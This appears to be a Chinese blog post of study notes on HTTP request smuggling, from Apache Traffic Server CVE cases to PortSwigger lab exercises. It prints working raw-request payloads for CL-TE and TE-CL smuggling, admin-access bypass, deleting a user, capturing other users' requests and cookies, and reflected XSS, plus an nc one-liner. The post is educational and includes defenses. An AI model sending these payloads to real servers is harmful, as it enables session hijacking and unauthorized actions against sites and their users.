+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191025143858158.png" alt="image-20191025143858158"></p>
+<p>将接收到的url作为跳转。</p>
+<p>如果请求包发送如下：</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191025143935584.png" alt="image-20191025143935584"></p>
+<p>也就是在正常的url中加入CRLF构造Set-Cookie</p>
+<p>发送过去的response如下：</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191025144043105.png" alt="image-20191025144043105"></p>
+<p>这就直接将Cookie修改成了自己定义的值，更进一步可以构造两个CRLF，直接控制返回，也就是上面的响应拆分攻击，很危险但是也很容易避免，收到的url参数对CRLF做个过滤就好了</p>
+<hr>
+<h4 id="正式回到CVE的学习"><a href="#正式回到CVE的学习" class="headerlink" title="正式回到CVE的学习"></a>正式回到CVE的学习</h4><p>关键的利用点在：ATS在解析HTTP请求的时候，如果遇到NULL，也就是%00或者说\0,就会返回一个400，但是TCP连接并没有关闭，后面的数据会保存在缓冲区中。这就造成了问题。</p>
+<p>假如构造如下请求：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+foo: bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+GET /2333 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div>
+
+<p>注意\0处可以将报文截断，形成两个报文：</p>
+<p>第一个</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+aa:</code></pre></div>
+
+<p>第二个</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+foo: bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+GET /2333 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div>
+
+<p>第一个报文在读取的时候读取到\0产生400，,第二个报文都不符合 key: value的格式，产生400 Bad Request</p>
+<p>当报文写成如下时：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+GET /1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div>
+
+<p>或者</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+GET /1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div>
+
+<p>截断没有关闭TCP连接，后面正常的GET页面进入缓冲区，这就写入了两个请求报文，但是这样没有什么用，产生的response也是两个，结合上面HTTP响应切分攻击的思路，就是一个报文得到两个response，进而劫持掉正常用户的response。</p>
+<p>怎么伪装成一个报文呢，这里文章中给出了解决办法：absoluteURI，就是GET直接请求完整URL</p>
+<p>构造数据包如下</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php">GET /<span class="hljs-number">400</span> HTTP/<span class="hljs-number">1.1</span>\r\n
+Host: ats.mengsec.com\r\n
+aa: \<span class="hljs-number">0</span>bb\r\n
+GET http:<span class="hljs-comment">//ats.mengsec.com/1.html HTTP/1.1\r\n</span>
+\r\n
+GET /<span class="hljs-number">404</span> HTTP/<span class="hljs-number">1.1</span>\r\n
+Host: ats.mengsec.com\r\n
+\r\n</code></pre></div>
+
+<p>注意观察，这里就满足了key: value的格式：</p>
+<p>key为：GET http</p>
+<p>value为：//ats.mengsec.com/1.html HTTP/1.1\r\n</p>
+<p>由于截断，返回了第一个报文的400，但是TCP连接没有中断，导致GET <a target="_blank" rel="noopener" href="http://ats.mengsec.com/1.html">http://ats.mengsec.com/1.html</a> HTTP/1.1\r\n 进入缓冲区，得到一个相应，后面对404的请求也获得一个报文。相当于两个Request获得了三个Response，这就会造成问题，根据Pipeline先入先出的规则，额外产生的报文将返回给正常用户。如果页面含有xss或者CSRF倒是可以好好利用。（但是不知道可不可以像上面那个http响应切分控制响应报文）</p>
+<p><strong>这个特性的补丁就是当遇到400错误的时候，关闭TCP连接。</strong></p>
+<hr>
+<p>略微提一句：<br>上面的数据包可以用burp，也可以用nc，nc用法在文章中给出：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;GET /400 HTTP/1.1\r\n&#x27;</span>\
+<span class="hljs-string">&#x27;Host: ats.mengsec.com\r\n&#x27;</span>\
+<span class="hljs-string">&#x27;aa: \0bb\r\n&#x27;</span>\
+<span class="hljs-string">&#x27;GET http://ats.mengsec.com/1.html HTTP/1.1\r\n&#x27;</span>\
+<span class="hljs-string">&#x27;\r\n&#x27;</span>\
+<span class="hljs-string">&#x27;GET /404 HTTP/1.1\r\n&#x27;</span>\
+<span class="hljs-string">&#x27;Host: ats.mengsec.com\r\n&#x27;</span>\
+<span class="hljs-string">&#x27;\r\n&#x27;</span>\
+| nc 10.211.55.22 80</code></pre></div>
+
+
+
+<h3 id="三、可利用点3：ATS-7-1-2-版本中没有对RFC2616标准严格实现。"><a href="#三、可利用点3：ATS-7-1-2-版本中没有对RFC2616标准严格实现。" class="headerlink" title="三、可利用点3：ATS 7.1.2 版本中没有对RFC2616标准严格实现。"></a>三、可利用点3：ATS 7.1.2 版本中没有对RFC2616标准严格实现。</h3><p>补丁是这样的：<code>当Content-Length请求头不匹配时，响应400，删除具有相同Content-Length请求头的重复副本，如果存在Transfer-Encoding请求头，则删除Content-Length请求头。</code></p>
+<p>也就是说，在存在Transfer-Encoding时，并没有删除Content-Length请求头。</p>
+<p>文中的测试也证明了这点：<br>构造请求：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+G</code></pre></div>
+
+<p>这样的话，很容易就可以进行CL-TE攻击。</p>
+<p>采用之前测试的admin.php和payload：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length: 83<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+GET /admin.php?del=mengchen HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+foo:</code></pre></div>
+
+<p>多次发包如下：</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1570691722000-image-20191009175211574.png-w331s" alt="image-20191009175211574"></p>
+<p>如果管理员登录请求了一下主页</p>
+<div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>lnmp.mengsec.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>admin=1</code></pre></div>
+
+<p>结果就是拼接成一个报文：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /admin.php?<span class="hljs-attribute">del</span>=mengchen HTTP/1.1\r\n
+Host: lnmp.mengsec.com\r\n
+attack: 1\r\n
+foo: <span class="hljs-builtin-name">GET</span> / HTTP/1.1
+Host: lnmp.mengsec.com
+Cookie: <span class="hljs-attribute">admin</span>=1</code></pre></div>
+
+<p>带着Cookie删除了管理员</p>
+<h3 id="四、利用缓存"><a href="#四、利用缓存" class="headerlink" title="四、利用缓存"></a>四、利用缓存</h3><p>原文：带有漏洞的ATS服务器在缓存命中的时候，会直接忽略Content-Length，这是请求体中的数据会被ATS当做另外的HTTP请求来处理。</p>
+<p>这就很容易理解了，忽略了Content-Length，在请求体重写一个正常的报文就可以直接造成这个报文走私。</p>
+<p>给ATS服务器开启缓存功能</p>
+<p>下面贴一下原文的测试样例：</p>
+<p>random_str.php</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randomkeys</span>(<span class="hljs-params"><span class="hljs-variable">$length</span></span>)</span>&#123; 
+    <span class="hljs-variable">$output</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$a</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$a</span>&lt;<span class="hljs-variable">$length</span>; <span class="hljs-variable">$a</span>++) &#123;
+        <span class="hljs-variable">$output</span> .= chr(mt_rand(<span class="hljs-number">33</span>, <span class="hljs-number">126</span>));
+    &#125;   
+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
+&#125;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get random string: &quot;</span>;
+<span class="hljs-keyword">echo</span> randomkeys(<span class="hljs-number">8</span>);</code></pre></div>
+
+<p>构造请求包：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET /1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Cache-control: max-age=10<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length: 56<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+GET /random_str.php HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div>
+
+
+
+<h2 id="0x03-实际攻击利用"><a href="#0x03-实际攻击利用" class="headerlink" title="0x03 实际攻击利用"></a>0x03 实际攻击利用</h2><h3 id="使用CL-TE绕前端服务器安全控制"><a href="#使用CL-TE绕前端服务器安全控制" class="headerlink" title="使用CL-TE绕前端服务器安全控制"></a>使用CL-TE绕前端服务器安全控制</h3><p>这里直接对文章的payload进行记录</p>
+<p>使用CL-TE进行攻击，主要在于构造好Content-Length</p>
+<p>要达到的效果是：绕过ATS对/admin的限制。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: ac<span class="hljs-number">1</span>b<span class="hljs-number">1</span>f<span class="hljs-number">991</span>edef<span class="hljs-number">1</span>f<span class="hljs-number">1802323</span>bc<span class="hljs-number">00</span>e<span class="hljs-number">10084</span>.web-security-academy.net
+<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span>
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
+<span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>
+<span class="hljs-attribute">Cookie</span>: session=Iegl<span class="hljs-number">0</span>O<span class="hljs-number">4</span>SGnwlddlFQzxduQdt<span class="hljs-number">8</span>NwqWsKI
+<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">38</span>
+<span class="hljs-attribute">Transfer</span>-Encoding: chunked
+
+<span class="hljs-attribute">0</span>
+
+<span class="hljs-attribute">GET</span> /admin HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">foo</span>: bar</code></pre></div>
+
+<p>可以总结出，chunked的发包使用：\r\n0\r\n即可</p>
+<p>CL计算从0开始</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET /admin HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>foo: bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div>
+
+<p>正好38个字符，所以CL写上38</p>
+<p>前端服务器处理整个报文，没有访问/admin的请求，直接发送给了后端服务器，后端服务器解析成两个报文，后面一个为对/admin的请求，这里为了不干扰后面别的用户的访问，在foo: bar后面加了两个\r\n</p>
+<p>得到相应：</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191030201836590.png" alt="image-20191030201836590"></p>
+<p>修改Host为localhost后可以访问admin，然后删除carlos用户。</p>
+<h3 id="使用TE-CL绕过前段服务器安全控制"><a href="#使用TE-CL绕过前段服务器安全控制" class="headerlink" title="使用TE-CL绕过前段服务器安全控制"></a>使用TE-CL绕过前段服务器安全控制</h3><p>构造如下：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: ac<span class="hljs-number">1</span>b<span class="hljs-number">1</span>f<span class="hljs-number">991</span>edef<span class="hljs-number">1</span>f<span class="hljs-number">1802323</span>bc<span class="hljs-number">00</span>e<span class="hljs-number">10084</span>.web-security-academy.net
+<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span>
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
+<span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>
+<span class="hljs-attribute">Cookie</span>: session=Iegl<span class="hljs-number">0</span>O<span class="hljs-number">4</span>SGnwlddlFQzxduQdt<span class="hljs-number">8</span>NwqWsKI
+<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">4</span>
+<span class="hljs-attribute">Transfer</span>-Encoding: chunked
+
+<span class="hljs-attribute">5b</span>
+<span class="hljs-attribute">GET</span> /admin/delete?username=carlos HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: localhost
+<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">15</span>
+
+<span class="hljs-attribute">MengChen</span>
+<span class="hljs-attribute">0</span></code></pre></div>
+
+<p>5b 代表长度：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET /admin/delete?username=carlos HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: localhost<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>MengChen</code></pre></div>
+
+<p>正好长度为91</p>
+<p>后面的\r\n\0\r\n为chrunk的结束格式。</p>
+<h3 id="获取前段服务器重写请求字段"><a href="#获取前段服务器重写请求字段" class="headerlink" title="获取前段服务器重写请求字段"></a>获取前段服务器重写请求字段</h3><p>为什么需要获取到并且添加请求字段呢，有时候后端服务器会处理一些必须由前段服务器处理过后再添加上去的请求字段：</p>
+<ul>
+<li>描述TLS连接所使用的协议和密码</li>
+<li>包含用户IP地址的XFF头</li>
+<li>用户的会话令牌ID</li>
+</ul>
+<p>获取这些关键的请求字段的方法是：</p>
+<ul>
+<li>找一个能够将请求参数的值输出到响应中的POST请求</li>
+<li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li>
+<li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li>
+</ul>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: ac<span class="hljs-number">831</span>f<span class="hljs-number">8</span>c<span class="hljs-number">1</span>f<span class="hljs-number">287</span>d<span class="hljs-number">3</span>d<span class="hljs-number">808</span>d<span class="hljs-number">2</span>e<span class="hljs-number">1</span>c<span class="hljs-number">00280087</span>.web-security-academy.net
+<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span>
+<span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded
+<span class="hljs-attribute">Cookie</span>: session=<span class="hljs-number">2</span>rOrjC<span class="hljs-number">16</span>pIb<span class="hljs-number">7</span>ZfURX<span class="hljs-number">8</span>QlSuU<span class="hljs-number">1</span>v<span class="hljs-number">6</span>UMAXLA
+<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">77</span>
+<span class="hljs-attribute">Transfer</span>-Encoding: chunked
+
+<span class="hljs-attribute">0</span>
+
+
+<span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">70</span>
+<span class="hljs-attribute">Connection</span>: close
+
+<span class="hljs-attribute">search</span>=<span class="hljs-number">123</span></code></pre></div>
+
+<p>（后面应该还有一个CRLF，不然凑不成长度77）</p>
+<p>0\r\n\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 70\r\nConnection: close\r\n\r\nsearch=123\r\n</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191030205526301.png" alt="image-20191030205526301"></p>
+<p>通过CL-TE走私的请求为：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>70
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+
+search=123</code></pre></div>
+
+<p> 其中<code>Content-Length</code>的值为70，显然下面携带的数据的长度是不够70的，因此后端服务器在接收到这个走私的请求之后，会认为这个请求还没传输完毕，继续等待传输。 </p>
+<p>接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达70时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。</p>
+<p>在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1570691726000-image-20190903114641180.png-w331s" alt="image-20190903114641180"></p>
+<p>（感觉这个地方是怎么达到长度70的不是很理解）</p>
+<h3 id="获取其他用户的请求。"><a href="#获取其他用户的请求。" class="headerlink" title="获取其他用户的请求。"></a>获取其他用户的请求。</h3><p> 原文：</p>
+<p>我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。 </p>
+<p>相当于走私一个请求然后吃掉其他用户的请求，如果别人用户的请求中带有cookie，则我们就可以劫持到用户的会话了。</p>
+<p> <strong>最重要的一点是，走私的请求是不完整的</strong></p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: ac<span class="hljs-number">661</span>f<span class="hljs-number">531</span>e<span class="hljs-number">07</span>f<span class="hljs-number">12180</span>eb<span class="hljs-number">2</span>f<span class="hljs-number">1</span>a<span class="hljs-number">009</span>d<span class="hljs-number">0092</span>.web-security-academy.net
+<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span>
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
+<span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>
+<span class="hljs-attribute">Cookie</span>: session=oGESUVlKzuczaZSzsazFsOCQ<span class="hljs-number">4</span>fdLetwa
+<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">267</span>
+<span class="hljs-attribute">Transfer</span>-Encoding: chunked
+
+<span class="hljs-attribute">0</span>
+
+<span class="hljs-attribute">POST</span> /post/comment HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: ac<span class="hljs-number">661</span>f<span class="hljs-number">531</span>e<span class="hljs-number">07</span>f<span class="hljs-number">12180</span>eb<span class="hljs-number">2</span>f<span class="hljs-number">1</span>a<span class="hljs-number">009</span>d<span class="hljs-number">0092</span>.web-security-academy.net
+<span class="hljs-attribute">Cookie</span>: session=oGESUVlKzuczaZSzsazFsOCQ<span class="hljs-number">4</span>fdLetwa
+<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">400</span>
+
+<span class="hljs-attribute">csrf</span>=JDqCEvQexfPihDYr<span class="hljs-number">08</span>mrlMun<span class="hljs-number">4</span>ZJsrpX<span class="hljs-number">7</span>&amp;postId=<span class="hljs-number">5</span>&amp;name=meng&amp;email=email%<span class="hljs-number">40</span>qq.com&amp;website=&amp;comment=</code></pre></div>
+
+<p>这样后面走私的请求是不完整的，等到别的用户的请求到来的时候，会直接拼接到后面，</p>
+<h3 id="利用反射型XSS"><a href="#利用反射型XSS" class="headerlink" title="利用反射型XSS"></a>利用反射型XSS</h3><p>这里不是很明白为什么在UA出现的地方构造payload</p>
+<p>payload如下：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac801fd21fef85b98012b3a700820000.web-security-academy.net
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>123
+<span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked
+
+0
+
+<span class="hljs-keyword">GET</span> <span class="hljs-string">/post?postId=5</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;#
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded</code></pre></div>
+
+<h3 id="进行缓存投毒"><a href="#进行缓存投毒" class="headerlink" title="进行缓存投毒"></a>进行缓存投毒</h3><p>还不太明白，以后再深入学：</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/#31-cl0get">https://paper.seebug.org/1048/#31-cl0get</a></p>
+<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ul>
+<li><p>禁用代理服务器与后端服务器之间的TCP连接重用。</p>
+</li>
+<li><p>使用HTTP/2协议。</p>
+</li>
+<li><p>前后端使用相同的服务器。</p>
+<p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。 </p>
+</li>
+</ul>
+<p>从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。 </p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/#31-cl0get">https://paper.seebug.org/1048/#31-cl0get</a> </li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">HTTP请求走私</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">HTTP请求走私</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/10/19/%E3%80%90CISCN-2019%E5%88%9D%E8%B5%9B%E3%80%91Love-Math/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【CISCN 2019初赛】Love Math</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function() {
